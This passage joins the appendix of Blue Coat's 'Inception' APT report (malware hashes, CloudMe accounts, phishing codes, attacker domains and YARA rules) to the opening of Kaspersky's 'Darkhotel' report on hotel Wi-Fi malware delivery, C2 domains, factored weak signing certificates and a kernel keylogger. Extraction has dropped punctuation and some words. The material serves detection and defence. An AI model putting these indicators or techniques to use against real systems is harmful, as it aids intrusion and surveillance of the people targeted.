              The attribution indicators point in different directions and can
t be given much
              weight. These attacks can in theory be the creation of nation states or
              resourceful private entities - we consider it very unlikely that they are performed
              by one or just a few individuals.
 2014 Blue Coat Systems, Inc. All rights reserved. Blue Coat, the Blue Coat logos, ProxySG, PacketShaper, CacheFlow, IntelligenceCenter, CacheEOS, CachePulse, Crossbeam,
K9, the K9 logo, DRTR, Mach5, Packetwise, Policycenter, ProxyAV, ProxyClient, SGOs, WebPulse, Solera Networks, the Solera Networks logos, DeepSee, 
See Everything. Know
Everything.
Security Empowers Business
, and BlueTouch are registered trademarks or trademarks of Blue Coat Systems, Inc. or its affiliates in the U.S. and certain other
countries. This list may not be complete, and the absence of a trademark from this list does not mean it is not a trademark of Blue Coat or that Blue Coat has stopped using the
trademark. All other trademarks mentioned in this document owned by third parties are the property of their respective owners. This document is for informational purposes
only. Blue Coat makes no warranties, express, implied, or statutory, as to the information in this document.
                                                                                                                                                      51
APPENDIX:
Exploited RTF sample md5
0a0f5a4556c2a536ae7b81c14917ec98
19ad782b0c58037b60351780b0f43e43
20c2a4db77aabec46750878499c15354
23d6fabda409d7fc570c2238c5487a90
3ff9c9e3228b630b8a68a05d6c3e396d
4624da84cae0f8b689169e24be8f7410
4a4874fa5217a8523bf4d1954efb26ef
4dcdc1110d87e91cda19801755d0bcf2
516a514bf744efb5e74839ddaf02a540
5e3ecfd7928822f67fbb3cd9c83be841
685d9341228f18b0fd7373b7088e56a7
822d842704596a2cf918863ea2116633
8488303c2a0065d9ac8b5fecf1cb4fc9
8997d23b3d1bd96b596baee810333897
8cd5974a49a9d6c49294312bf09f64ed
9738faf227bcd12bcab577a0fb58744d
bc196dc8a14484e700169e1a78cf879e
b453ec7fd92bee23846ff36bf903ddc0
2fcbea8a344137421a86b046a6840265
Dropped first-stage DLL
0bd0fd3cbbcfddc4048228ce08ca26c2
0bda50e05d575446de55d50c631afb53
0f12614fa7a9bf7bcc951eec7b78658d
2f9ca7680ec0945455988d91d9b325f8
352da994d867eb68a178bb7f2fb672bc
3a4a9d26c9c3c8d0fd697b036216319e
43587e5fcf6770259026ec2ca6f41aa6
4628082e11c75b078ff0465523598040
554d4c4da2e3603282b097b0e68ad11a
670ac2e315088d22b2cb92acffc3e997
71bdd14cbc96badb79dfb0f23c52a9ee
72f020b564bc9771e7efe203881f5ef9
80a7883c33a60b4c0178c9c8fb7d1440
84fa976d9ed693668b3f97d991da0e97
89d851cbd2dc1988bb053235414f8928
a5aeda357ba30d87c1187b644baad8a0
c3f2fb7840228924e5af17787e163e07
d007616dd3b2d52c30c0ebb0937e21b4
d171db37ef28f42740644f4028bcf727
d3886495935438f4a130d217d84ae8cb
ea0d80db2075f789fc88c3fdf6e3d93e
                                   52
f2840be535fbaf8b15470d61967d527b
90c93c9b80bbf31dce8434a565a0ec7b
                                   53
Downloaded second-stage plugins:
5c3de5b2762f4c5f91affaa6bcadd21b
86b2372297619b1a9d8ad5acdf1a6467
43112e09240caebb3c72855c9f6fc9e5
Downloaded Chinese malware, sccm.exe:
dd8790455109497d49c2fa2442cf16f7
Router proxy malware:
a6b2ce1cc02c902ba6374210faf786a3
83b383884405190683d748f4a95f48d4
62fc46151cfe1e57a8fa00065bde57b0
036fbc5bffd664bc369b467f9874fac4
488e54526aa45a47f7974b4c84c1469a
24a9bbb0d4418d97d9050a3dd085a188
b0c2466feb24519c133ee04748ff293f
62dc87d1d6b99ae2818a34932877c0a4
7c6727b173086df15aa1ca15f1572b3f
80528b1c4485eb1f4a306cff768151c5
e1d51aa28159c25121476ffe5f2fc692
Android malware:
046a3e7c376ba4b6eb21846db9fc02df
b0d1e42d342e56bc0d20627a7ef1f612
IOS malware (WhatsAppUpdate.deb):
4e037e1e945e9ad4772430272512831c
Blackberry malware:
0fb60461d67cd4008e55feceeda0ee71
60dac48e555d139e29edaec41c85e2b4
                                        54
Verified malicious CloudMe accounts (based on malware):
garristone                frogs6352                 droll5587
franko7046                daw0996                   samantha2064
sanmorinostar             chak2488                  chloe7400
tem5842                   corn6814                  browner8674935
bimm4276                  james9611                 parker2339915
carter0648                lisa.walker               young0498814
depp3353                  billder1405               hurris4124867
Likely malicious CloudMe accounts (based on access patterns):
adams2350                 frog0722                  norbinov
adison8845                gabriel.gonzalez          nul7782
allan1252                 garsia7871                parker0519
altbrot                   gray7631                  poulokoel
amandarizweit             great2697                 pourater
anderson9357              green3287                 red6039
astanaforse               helen.scott               red6247
baker6737                 helenarix                 reed6865
bear9126                  hill5289                  roges2913
bell0314                  jackson4996               roi5991
betty.swon                james9521                 ronald.campbell
brown7169                 john.thompson             rosse2681
brown7356                 kalo3113                  samantares
button8437                kas2114                   scott5008
carter0648                kenneth.wilson            sebastianturne
carter3361                king7460                  swon5826
clark6821                 kol8184                   taylor9297
collins2980               klauseroi                 tem5842
cook2677                  ksjdkljeijd               thirt1353
cooper2999                lariopas                  thomas9521
cooper7271                lopez9524                 thomson3474
cox7457                   lorrens6997               turner3027
cruz3540                  martinez4502              vasabilas
david.miller              miller8350                visteproi
depp3353                  minesota1459              voldemarton
diaz1365                  moore6562                 wer8012
din8864                   moore7529                 white3946
evans0198                 morris9351                william.moore
farrel0829                morris9461                wilson2821
ferrary2507               murphy5975                wilson2905
ferre7053                 nedola7067                wonder7165
flores5975                nelson0000                wrong8717
fox0485                   ninazer
                                                                      55
Bit.ly-shortened MMS phishing links:
Action Code     Operator                HQ location    Links created
95501           Vodafone                UK                         270
81825           T-Mobile                Germany                    213
66968           Proximus                Belgium                    197
67840           China Mobile            China                      173
98491           Zain                    Saudi Arabia               126
58129           Mobilkom (A1 Telekom)   Austria                    124
12081           Orange                  France                     124
24806           Hamrah-e-Avval          Iran                       111
41967           Mobilnil                Egypt                      105
46736           TeliaSonera             Sweden                     100
13911           Mobistar                Belgium                      78
65842           O2                      UK, Germany                  78
70887           Telcomsel               Indonesia                    74
98455           Kcell                   Kazakhstan                   74
94382           Mobilink                Pakistan                     72
12988           Airtel                  India                        65
52378           Vodacom                 South Africa                 63
99578           Maxis                   Malaysia                     59
90298           Swisscom                Switzerland                  59
86791           Wind Mobile             Canada                       56
21522           MTN                     South Africa                 56
26059           MTS                     Russia                       55
67838           Alfa                    Lebanon                      51
96735           Kyivstar                Ukraine                      51
99753           T-Mobile                Germany                      50
24906           Omnitel                 Lithuania                    48
17150           MtcTouch                Lebanon                      43
53272           Ooredoo                 Qatar                        36
77008           BASE                    Belgium                      33
31756           Djezzy                  Algeria                      29
14269           Beeline                 Russia                       29
76587           Omantel                 Oman                         28
44974           Velcom                  Belarus                      27
77849           E-plus                  Germany                      26
76102           Celcom                  Malaysia                     26
31021           Azercell                Azerbaijan                   24
16611           TELE2                   Sweden                       24
18675           Mobifone                Vietnam                      22
65942           T-Mobile                Germany                      20
85993           Sudatel                 Sudan                        20
65090           Diallog                 Belarus                      19
61384           Ufone                   Pakistan                     19
11426           TMCell                  Turkmenistan                 19
58043           Globe                   Philippines                  18
70102           SingTel                 Singapore                    18
90374           Avea                    Turkey                       18
57464           DiGi                    Malaysia                     16
77995           Megacom                 Kyrgyzstan                   15
27964           Warid                   Pakistan                     11
                                                             56
15029   DSTCom              Brunei             10
70959   Smart               Cambodia           10
83722   Asiacell            Iraq               10
97143   Maroc Telecom       Morocco             9
25786   Magti               Georgia             6
34659   Geocell             Georgia             6
56167   Bakcell             Azerbaijan          5
42397   Dhiraagu            Maldives            5
54375   Telfort             Netherlands         5
43142   Banglalink          Bangladesh          2
90128   EMT                 Estonia             2
24709   MTNL                India               2
92444   Safaricom           Kenya               2
60354   Plus                Poland              2
84899   Sabafon             Yemen               2
14115   Sri Lanka Telecom   Sri Lanka           1
42758   Lycamobile          UK                  1
                                          57
Undetermined MMS phishing action codes (code, number of links):
13975   320       54780   12     14659       3       19343   1
51557   119       92529   11     16814       3       20732   1
37020   88        61135   10     20247       3       25938   1
11111   71        89838   10     24037       3       26346   1
61925   64        44638   9      27307       3       26842   1
91130   63        60007   9      31785       3       27758   1
91200   58        67648   9      37629       3       30053   1
79711   47        72371   9      49284       3       36962   1
43312   42        96565   9      54512       3       37477   1
75687   37        99094   9      68798       3       37686   1
81544   37        24483   8      79286       3       38686   1
51949   29        46127   8      85076       3       40606   1
23562   28        55223   8      94046       3       42067   1
96780   25        99061   7      11468       2       50935   1
72026   24        20470   6      20460       2       52833   1
78098   23        22798   6      25559       2       55991   1
96878   20        32331   6      41075       2       59635   1
18986   19        40772   6      45834       2       65025   1
21782   19        52741   6      57403       2       65414   1
57673   18        63095   6      65855       2       66185   1
62088   18        70610   6      71103       2       67120   1
37267   16        92826   6      71633       2       74336   1
40019   16        25387   5      75778       2       74800   1
46681   15        69153   5      77776       2       75906   1
47390   15        72564   5      80209       2       89027   1
22775   14        24122   4      91062       2       89675   1
80998   14        47240   4      91212       2       90962   1
98758   14        76002   4      91869       2       91774   1
36942   13        82852   4      13335       1       94776   1
93620   13        83478   4      15318       1       98886   1
97276   13        97561   4      16155       1
                                                                  58
Attacker-owned domains:
haarmannsi.cz
sanygroup.co.uk
ecolines.es
blackberry-support.herokuapp.com (DynDNS)
                                            59
YARA detection rules:
rule InceptionDLL
      meta:
            author = "Blue Coat Systems, Inc"
            info = "Used by unknown APT actors:   Inception"
      strings:
            $a = "dll.polymorphed.dll"
            $b = {83 7d 08 00 0f 84 cf 00 00 00   83   7d   0c   00   0f   84 c5   00
            00 00 83 7d 10 00 0f 84 bb 00 00 00   83   7d   14   08   0f   82 b1   00
            00 00 c7 45 fc 00 00 00 00 8b 45 10   89   45   dc   68   00   00}
            $c = {FF 15 ?? ?? ?? ?? 8B 4D 08 8B   11   C7   42   14   00   00 00   00
            8B 45 08 8B 08 8B 55 14 89 51 18 8B   45   08   8B   08   8B   55 0C   89
            51 1C 8B 45 08 8B 08 8B 55 10 89 51   20   8B   45   08   8B   08}
            $d = {68 10 27 00 00 FF 15 ?? ?? ??   ??   83   7D   CC   0A   0F 8D   47
            01 00 00 83 7D D0 00 0F 85 3D 01 00   00   6A   20   6A   00   8D 4D   D4
            51 E8 ?? ?? ?? ?? 83 C4 0C 8B 55 08   89   55   E8   C7   45   D8}
            $e = {55 8B EC 8B 45 08 8B 88 AC 23   03   00   51   8B   55   0C 52   8B
            45 0C 8B 48 04 FF D1 83 C4 08 8B 55   08   8B   82   14   BB   03 00   50
            8B 4D 0C 51 8B 55 0C 8B 42 04}
      condition:
            any of them
rule InceptionRTF {
      meta:
            author = "Blue Coat Systems, Inc"
            info = "Used by unknown APT actors: Inception"
      strings:
            $a = "}}PT@T"
            $b = "XMLVERSION \"3.1.11.5604.5606"
            $c = "objclass Word.Document.12}\\objw9355"
      condition:
            all of them
rule InceptionMips {
      meta:
            author = "Blue Coat Systems, Inc"
            info = "Used by unknown APT actors: Inception"
      strings:
            $a = "start_sockat" ascii wide
            $b = "start_sockss" ascii wide
            $c = "13CStatusServer" ascii wide
      condition:
            all of them
                                                                               60
rule InceptionVBS {
      meta:
            author = "Blue Coat Systems, Inc"
            info = "Used by unknown APT actors: Inception"
      strings:
            $a = "c = Crypt(c,k)"
            $b = "fso.BuildPath( WshShell.ExpandEnvironmentStrings(a),
            nn)"
      condition:
            all of them
rule InceptionBlackberry {
      meta:
            author = "Blue Coat Systems, Inc"
            info = "Used by unknown APT actors: Inception"
      strings:
            $a1 = "POSTALCODE:"
            $a2 = "SecurityCategory:"
            $a3 = "amount of free flash:"
            $a4 = "$
71|'1'|:"
            $b1 = "God_Save_The_Queen"
            $b2 = "UrlBlog"
      condition:
            all of ($a*) or all of ($b*)
rule InceptionAndroid {
      meta:
            author = "Blue Coat Systems, Inc"
            info = "Used by unknown APT actors: Inception"
      strings:
            $a1 = "BLOGS AVAILABLE="
            $a2 = "blog-index"
            $a3 = "Cant create dex="
      condition:
            all of them
rule InceptionIOS {
      meta:
            author = "Blue Coat Systems, Inc"
            info = "Used by unknown APT actors: Inception"
      strings:
            $a1 = "Developer/iOS/JohnClerk/"
            $b1 = "SkypeUpdate"
            $b2 = "/Syscat/"
            $b3 = "WhatsAppUpdate"
      condition:
      $a1 and any of ($b*)
                                                                   61
Acknowledgements
The following entities have helped in big and small ways. Big thanks to all.
CIRCL.LU
Crowdstrike
F-Secure Corporation
iSight Partners
Kaspersky Labs
Symantec Corporation
We also owe a big debt of gratitude to Ryan W. Smith of Blue Coat who helped
us tremendously with the analysis of the mobile malware.
                                                                               62
The Darkhotel APT
A Story of Unusual
Hospitality
Version 1.0
November, 2014
Global Research and Analysis Team
Contents
Executive Summary.................................................................................................3
Introduction.............................................................................................................4
Analysis....................................................................................................................5
   Delivery - Hotels/Business Centers and Indiscriminate Spread.....................5
      Hotels and Business Centers Spread.........................................................5
      Abusing Network Infrastructure...................................................................6
      Indiscriminate Spread..................................................................................7
      Darkhotel Spear-phishing Campaigns........................................................8
      Recent 0-day Deployment...........................................................................9
   Digital Certificates and Delegitimizing Certificate Authority Trust...................9
      Cracking the keys...................................................................................... 12
      Other Tapaoux Certificates........................................................................ 12
   Enhanced Keyloggers and Development...................................................... 13
      Keylogger Code.......................................................................................... 13
Interesting Malware Components....................................................................... 15
    Small Downloader.......................................................................................... 15
    Information Stealer......................................................................................... 16
    Trojan.Win32.Karba.e..................................................................................... 17
    Trojan-Dropper & Injector (infected legitimate files)..................................... 17
    Selective Infector............................................................................................ 18
    Campaign Codes............................................................................................. 18
Infrastructure and Victims................................................................................... 19
    Sinkhole Domains........................................................................................... 19
    Victim Locations - KSN and Sinkhole Data.................................................... 20
        KSN Data................................................................................................... 20
        Sinkhole Data............................................................................................ 22
    Available ddrlog Victim Data........................................................................... 22
    C2 Communications and Structure............................................................... 24
    Victim Management........................................................................................ 25
        Researcher Activity.................................................................................... 26
Conclusions.......................................................................................................... 27
TLP: Green
                             For any inquiries, please contact intelreports@kaspersky.com
                                                                                    3
Executive Summary
The Darkhotel APT is a threat actor possessing a seemingly inconsistent and con-
tradictory set of characteristics, some advanced and some fairly rudimentary. In-
hospitably operating for almost a decade, the threat actor is currently active. The
actor
s offensive activity can be tied to specific hotel and business center Wi
and physical connections, some of it is also tied to p2p/file sharing networks,
and they have been known to spear-phish targets as well. Darkhotel tools are
detected as 
Tapaoux
Pioneer
Karba
, and 
Nemim
, among other names.
The following list presents a set of characteristics for the crew:
 operational competence to compromise, mis-use, and maintain access to
   global scale, trusted commercial network resources with strategic precision
   for years
 advanced mathematical and crypto-analytical offensive capabilities, along
   with no regard for undermining the trust extended to the Certificate Authorities
   and the PKI
 indiscriminately infect systems with some regional clarity over trusted and
   untrusted resources to build and operate large botnets
 well-developed low level keyloggers within an effective and consistent toolset
 a focus throughout campaigns on specific victim categories and tagging them
 a larger, dynamic infrastructure built of apache webservers, dynamic dns
   records, crypto libraries, and php webapps
 regular 0-day access - recent deployment of an embedded Adobe Flash 0-day
   spear-phishing exploit, and infrequent deployment of other 0-day resources to
   sustain larger campaigns over several years
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
Introduction
When unsuspecting guests, including situationally aware corporate executives and
high-tech entrepreneurs, travel to a variety of hotels and connect to the internet,
they are infected with a rare APT Trojan posing as any one of several major software
releases. These might be GoogleToolbar, Adobe Flash, Windows Messenger, etc.
This first stage of malware helps the attackers to identify more significant victims,
leading to the selective download of more advanced stealing tools.
At the hotels, these installs are selectively distributed to targeted individuals. This
group of attackers seems to know in advance when these individuals will arrive
and depart from their high-end hotels. So, the attackers lay in wait until these
travelers arrive and connect to the Internet.
The FBI issued advisories about similar hotel incidents; Australian government offi-
cials produced similar, newsworthy accounts when they were infected. While an FBI
announcement related to attacks on hotel guests overseas appeared in May 2012,
related Darkhotel samples were already circulating back in 2007. And available
Darkhotel server log data records connections as early as Jan 1, 2009. Addition-
ally, seeding p2p networks with widely spread malware and 0-day spear-phishing
attacks demonstrate that the Darkhotel APT maintains an effective toolset and a
long-running operation behind the questionable hospitality it shows its guests.
TLP: Green
                For any inquiries, please contact intelreports@kaspersky.com
                                                                                    5
Analysis
Delivery - Hotels/Business Centers and Indiscriminate Spread
Hotels and Business Centers Spread
The Darkhotel APT
s precise malware spread was observed in several hotels
networks, where visitors connecting to the hotel
s Wi-Fi were prompted to install
software updates to popular software packages.
Of course, these packages were really installers for Darkhotel APT
s backdoors,
added to legitimate installers from Adobe and Google. Digitally signed Darkhotel
backdoors were installed alongside the legitimate packages.
The most interesting thing about this delivery method is that the hotels require
guests to use their last name and room number to login, yet only a few guests
received the Darkhotel package. When visiting the same hotels, our honeypot
research systems couldn
t attract a Darkhotel attack. This data is inconclusive,
but it points to misuse of check-in information.
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
Abusing Network Infrastructure
The Darkhotel actor maintained an effective intrusion set at hotel networks,
providing ample access to unexpected points of attack over several years. These
staging points also provide the attackers with access to check-in/check-out and
identity information of visitors to high-end and luxury hotels.
As a part of an ongoing investigation, our research led us to embedded iframes
within hotel networks that redirected individuals
 web browsers to phony install-
ers. The attackers were very careful with the placement of these iframes and
executables on trusted resources - the hotels
 network login portals themselves.
The attackers were also very careful to immediately delete all traces of their
tools as soon as an attack was carried out successfully. Those portals are now
reviewed, cleaned and undergoing a further review and hardening process. We
observed traces of a couple of these incidents in late 2013 and early 2014 on
a victim hotel
s network. The attackers set up the environment and hit their
individual targets with precision. As soon as their target
s stay was over and
the attack-frame was closed, the attackers deleted their iframe placement and
backdoored executables from the hotel network. The attackers successfully de-
leted traces of their work from earlier attacks in another hotel, but their offensive
techniques were the same. Outside reports of the same activity at other hotels
provide enough data to confirm the same careful operations there.
The attack technique blurs the line between a couple of common APT tactics;
fairly inaccurate 
watering holes
 or 
strategic web compromises
 and more
accurate spearphishing techniques. In this case, the Darkhotel attackers wait
for their victim to connect to the Internet over the hotel Wi-Fi or the cable in their
room. There is a very strong likelihood the targets will connect over these resourc-
es, and the attackers rely on that likelihood, much like at a watering hole. But the
attackers also maintain truly precise targeting information over the victim
s visit,
much like they would know a victim
s email address and content interests in a
spearphishing attack. While setting up the attack, the Darkhotel attackers knew
the target
s expected arrival and departure times, room number, and full name,
among other data. This data enables the attackers to present the malicious
iframe precisely to that individual target. So, here we have yet another unique
characteristic of this attacker - they employ a loosely certain but highly precise
offensive approach.
TLP: Green
                For any inquiries, please contact intelreports@kaspersky.com
                                                                                       7
Indiscriminate Spread
An example of the Darkhotel APT
s indiscriminate malware spreading is dem-
onstrated by the way it seeds Japanese p2p sharing sites, where the malware
is delivered as a part of a large (approximately 900mb) rar archive. The archive
is also spread over bittorrent, as detailed below. Darkhotel uses this method to
distribute their Karba Trojan. These Japanese archives, translated for Chinese
speaking viewers, appear to be sexual in nature, part of an anime sex/military
comic scene, exposing the likely interests of potential targets.
This Darkhotel package was downloaded over 30,000 times in less than
six months. The p2p bittorrent Darkhotel offering is listed here, posted on
2013.11.22. It was spread throughout 2014.
.rar
This torrent serves up an almost 900 mb file. The rar archive decompresses to
directory full of encrypted zips, the associated decryptor and a password file for
decrypting the zips. But what looks like the AxDecrypt.exe decryptor is bound to
both the true decryptor and the dropper for the Darkhotel Catch.exe Karba Trojan.
When a user downloads the torrent and decrypts the zip files, the trojan surrepti-
tiously is installed and run on the victim system.
Catch.exe, detected as Backdoor.Win32.Agent.dgrn, communicates with the fol-
lowing Darkhotel command and control servers:
microdelta.crabdance.com
microyours.ignorelist.com
micronames.jumpingcrab.com
microchisk.mooo.com
microalba.serveftp.com
TLP: Green
                  For any inquiries, please contact intelreports@kaspersky.com
Other examples of this Darkhotel backdoor bound within a shared torrent include
adult content Japanese anime and more. There are tens of thousands of down-
loads of these individual torrents.
torrent\[hgd
]comic1
[5.08g][
\(comic1
7) [
shinogi
\[hgd
]comic1
[5.08g][
The associated Darkhotel backdoor was hosted on bittorrent, emule, etc, under
a variety of comic names. Examples include comics and anime offerings. Related
Darkhotel command and control server domains include:
 microblo5.mooo.com
 microyours.ignorelist.com
 micronames.jumpingcrab.com
 microchisk.mooo.com
 microalba.serveftp.com
Darkhotel Spear-phishing Campaigns
Darkhotel campaigns involving typical spear-phished Tapaoux implants publicly
appeared in bits and pieces several times over the past five years. These subproject
efforts targeted defense industrial base (DIB), government, and NGO organizations.
Email content on topics like nuclear energy and weaponry capabilities was used as
a lure. Early accounts were posted on contagio describing attacks on
NGO organi-
zations and government policy makers. This spear-phishing activity continues into
2014. The attacks follow the typical spear-phishing process and in the past couple of
months, exploited systems retrieved downloader executables from web servers like
hxxp://office
revision.com/update/files22/update.exe or hxxp://trade
inf.com/mt/
duspr.exe
Over the past few years the group has emailed links that redirect targets
 brows-
ers to Internet Explorer 0-day exploits. Sometimes the attachment itself includes
an Adobe 0-day exploit.
TLP: Green
                   For any inquiries, please contact intelreports@kaspersky.com
                                                                                                     9
Recent 0-day Deployment
This crew occasionally deploys 0-day exploits, but burns them when required. In
the past few years, they deployed 0-day spear-phishing attacks targeting Adobe
products and Microsoft Internet Explorer, including cve
2010
0188. In early 2014,
our researchers exposed their use of cve
2014
0497, a Flash 0-day described on
Securelist in early February.
The crew spear-phished a set of target systems connected to the Internet through
Chinese ISPs, and developed capabilities within the 0-day exploits to handle
hardened Windows 8.1 systems. It
s interesting that the Flash objects were
embedded in Korean documents titled 
List of the latest Japanese AV wind and
how to use torrents.docx
 (loose English translation). The dropped downloader
(d8137ded710d83e2339a97ee78494c34) delivered malcode similar to the
Information Stealer
 component functionality summarized below, and detailed
in Appendix D.
Digital Certificates and Delegitimizing Certificate Authority
Trust
The Darkhotel actors typically sign their backdoors with digital certificates of one
kind or another. However, the certificates originally chosen by this crew are very
interesting because of their weak keys and likely abuse by attackers. Here is a
listing of the certs that were commonly used to sign Darkhotel malcode, requiring
advanced mathematical capabilities to factorize the keys at the time. They are
not the only certificates used by the group. More recent activity suggests that the
group has stolen certificates to sign their code.
              Subordinate
CA Root       CA/Issuer            Owner                    Status         Valid From   Valid To
GTE           Digisign Server ID   flexicorp.jaring.my sha1/ Expired       12/17/2008   12/17/2010
CyberTrust    (Enrich)             RSA (512 bits)
GTE           Cybertrust           inpack.syniverse.my      Revoked        2/13/2009    2/13/2011
CyberTrust    SureServer CA        sha1/RSA (512 bits)
GTE           Cybertrust           inpack.syniverse.com     Revoked        2/13/2009    2/13/2011
CyberTrust    SureServer CA        sha1/RSA (512 bits)
GTE           Anthem Inc           ahi.anthem.com sha1/     Invalid Sig.   1/13/2010    1/13/2011
CyberTrust    Certificate Auth     RSA (512 bits)
TLP: Green
                        For any inquiries, please contact intelreports@kaspersky.com
              Subordinate
CA Root       CA/Issuer            Owner                       Status         Valid From   Valid To
GlobalSign    Deutsche Telekom www.kuechentraum2               Revoked        10/20/2008   10/25/2009
              CA 5             4.de
                                   sha1/RSA (512 bits)
GTE           Digisign Server ID   payments.bnm.gov.m y        Invalid Sig.   12/7/2009    12/7/2010
CyberTrust    (Enrich)             sha1/RSA (512 bits)
GTE           TaiCA Secure CA      esupplychain.com.tw         Expired        7/2/2010     7/17/2011
CyberTrust                         sha1/RSA (512 bits)
GTE           Digisign Server ID   mcrs2.digicert.com. my      Invalid Sig    3/28/2010    3/28/2012
CyberTrust    (Enrich)             sha1/RSA (512 bits)
GTE           Cybertrust           agreement.syniverse.    Invalid Sig        2/13/2009    2/13/2011
CyberTrust    SureServer CA        com sha1/RSA (512 bits)
GTE           Cybertrust           ambermms.syniverse.         Invalid Sig.   2/16/2009    2/16/2011
CyberTrust    SureServer CA        com
                                   sha1/RSA (512 bits)
Equifax       Equifax Secure       secure.hotelreykjavik.i s   Invalid Sig    2/27/2005    3/30/2007
Secure        eBusiness CA
1       md5/RSA (512 bits)
eBusiness
GTE           Cybertrust           stfmail.ccn.ac.uk sha1/     Invalid Sig.   11/12/2008   11/12/2011
CyberTrust    Educational CA       RSA (512 bits)
GTE           Digisign Server ID   webmail.jaring.my sha1/ Invalid Sig        6/1/2009     6/1/2011
CyberTrust    (Enrich)             RSA (512 bits)
GTE           Cybertrust           skillsforge.londonmet.      Invalid Sig    1/16/2009    1/16/2012
CyberTrust    Educational CA       ac.uk
                                   sha1/RSA (512 bits)
GTE           Digisign Server ID   anjungnet.mardi.gov. my     Invalid Sig    9/29/2009    9/29/2011
CyberTrust    (Enrich)             sha1/RSA (512 bits)
GTE           Anthem Inc            dl
middleware@an       Invalid Sig    4/22/2009    4/22/2010
CyberTrust    Certificate Authority them.com
                                   sha1/RSA (512 bits)
GTE           Cybertrust           ad
idmapp.cityofbrist       Invalid Sig    9/11/2008    9/11/2011
CyberTrust    Educational CA       ol.ac.uk
                                   sha1/RSA (512 bits)
Verisign      Verisign Class 3     secure2.eecu.com sha1/ Invalid Sig         10/25/2009   10/26/2010
              Secure OFX CA G3     RSA (512 bits)
Root Agency Root Agency            Microsoft                   Invalid Sig    6/9/2009     12/31/2039
                                   md5/RSA (1024 bits)
TLP: Green
                        For any inquiries, please contact intelreports@kaspersky.com
                                                                                               11
              Subordinate
CA Root       CA/Issuer       Owner                      Status        Valid From   Valid To
GTE           CyberTrust      trainingforms.syniverse.   Invalid Sig   2/17/2009    2/17/2011
Cybertrust    SureServer CA   com
                              sha1/RSA (512 bits)
All related cases of signed Darkhotel malware share the same Root Certificate
Authority and Intermediate Certificate Authority that issued certificates with
weak md5 keys (RSA 512 bits). We are confident that our Darkhotel threat actor
fraudulently duplicated these certificates to sign its malware. These keys were
not stolen. Many of the certificates were noted in a 2011 Fox
IT post 
Certificates Abused in the Wild
To further support this speculation please note the non
specific Microsoft Security
Advisory below, the Mozilla advisory addressing the issue at the time, and the
Entrust responses.
From Microsoft
s security advisory from Thursday, November 10, 2011:
Microsoft is aware that DigiCert Sdn. Bhd, a Malaysian subordinate certifica-
tion authority (CA) under Entrust and GTE CyberTrust, has issued 22 certifi-
cates with weak 512 bit keys. These weak encryption keys, when broken, could
allow an attacker to use the certificates fraudulently to spoof content, perform
phishing attacks, or perform man
middle attacks against all Web browser
users including users of Internet Explorer. While this is not a vulnerability in a
Microsoft product, this issue affects all supported releases of Microsoft Windows.
There is no indication that any certificates were issued fraudulently. Instead,
cryptographically weak keys have allowed some of the certificates to be dupli-
cated and used in a fraudulent manner.
Microsoft is providing an update for all supported releases of Microsoft Windows
that revokes the trust in DigiCert Sdn. Bhd. The update revokes the trust of the
following two intermediate CA certificates: Digisign Server ID 
 (Enrich), issued by
Entrust.net Certification Authority (2048) Digisign Server ID (Enrich), issued by
GTE CyberTrust Global Root
From Mozilla
s 2011 response:
While there is no indication they were issued fraudulently, the weak keys have
allowed the certificates to be compromised. Furthermore, certificates from this
CA contain several technical issues. They lack an EKU extension specifying their
intended usage and they have been issued without revocation information.
TLP: Green
                   For any inquiries, please contact intelreports@kaspersky.com
From Entrust
s response:
There is no evidence that the Digicert Malaysia certificate authorities have been
compromised.
Cracking the keys
Here are some notes on the costs and technical requirements of attacking these
certificates.
The computing power required to crack and factor an RSA 512 bit key was $5000
and the period of time required was about 2 weeks. (see http://lukenotricks.
blogspot.co.at/2010/03/rsa
factoring
service
weeks.html)
In October 2012, Tom Ritter reported that it would cost about $120
-$150, per-
haps even as little as $75.
Going even further back, there was much discussion about the technical meth-
ods of cracking these keys:
DJ Bernstein
s 2001 paper on building a machine reducing the cost of integer
factorization with Number Field Sieve techniques, breaking 1024 bit RSA keys.
s reaction and 2002 statement on whether or not 1024 bit RSA keys are
broken: 
NIST offered a table of proposed key sizes for discussion at its key man-
agement workshop in November 2001 [7]. For data that needs to be protected no
later than the year 2015, the table indicates that the RSA key size should be at
least 1024 bits. For data that needs to be protected longer, the key size should be
at least 2048 bits.
Other Tapaoux Certificates
Recent Tapaoux attacks and backdoors include malware signed with strong
SHA1/RSA 2048 bit certificates, suggesting certificate theft.
              Subordinate
CA Root       CA/Issuer        Owner               Status       Valid From    Valid To
thawte        thawte Primary   Xuchang Hongguang Revoked        7/18/2013     7/16/2014
              Root CA          Technology Co.,Ltd.
                               sha1/RSA (2048bits)
thawte        thawte Primary   Ningbo Gaoxinqu        Revoked   11/5/2013     11/5/2014
              Root CA          zhidian Electric Power
                               Technology Co., Ltd.
                               sha1/RSA (2048bits)
TLP: Green
                    For any inquiries, please contact intelreports@kaspersky.com
                                                                                   13
Enhanced Keyloggers and Development
One of the most interesting components that we discovered as a part of this cam-
paign was the use of a digitally
signed advanced keylogger. It is clean, well
written,
kernel level malcode. The languages of its strings are a mix of English and Korean. It
is signed with the familiar 
belinda.jablonski@syniverse.com
 digital certificate.
This keylogger is dropped by code running within svchost.exe on WinXP SP3,
which maintains an interesting debug string:
d:\KerKey\KerKey(
)\KerKey\release\KerKey.pdb
Note 
 means 
General
 in Korean
It probably was developed as a part of a mid-to-late 2009 project:
e:\project\2009\x\total_source\32bit\ndiskpro\src\ioman.c
Keylogger Code
This driver package is built to resemble a legitimate low-level Microsoft system
device. It is installed as a system kernel driver 
Ndiskpro
 service, described as
Microcode Update Device
. It is slightly surprising that no rootkit functionality
hides this service:
When loaded, the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff, and
retrieves keystroke data directly from port 0x60, the motherboard keyboard con-
troller itself. It buffers, then communicates logged user data to the running user
mode component. This component then encrypts and writes the retrieved values
ondisk to a randomly named .tmp, file like ffffz07131101.tmp. This file is located
in the same directory as the original dropper, which maintains persistence across
reboots with a simple addition to the HKCU run key.
TLP: Green
                For any inquiries, please contact intelreports@kaspersky.com
This keylogger module encrypts and stores gathered data in a log file, as men-
tioned previously. Its encryption algorithm is similar to RC4. The interesting part is
that the module randomly generates the key and stores it in an unexpected place:
in the middle of the log file name. Hence, the numeric part of the filename is used
as a seed for the pseudorandom number generator. The rand function is statically
linked to ensure same results on different computers.
TLP: Green
                For any inquiries, please contact intelreports@kaspersky.com
                                                                                  15
Interesting Malware Components
The Darkhotel toolset consists of multiple components that have been slightly
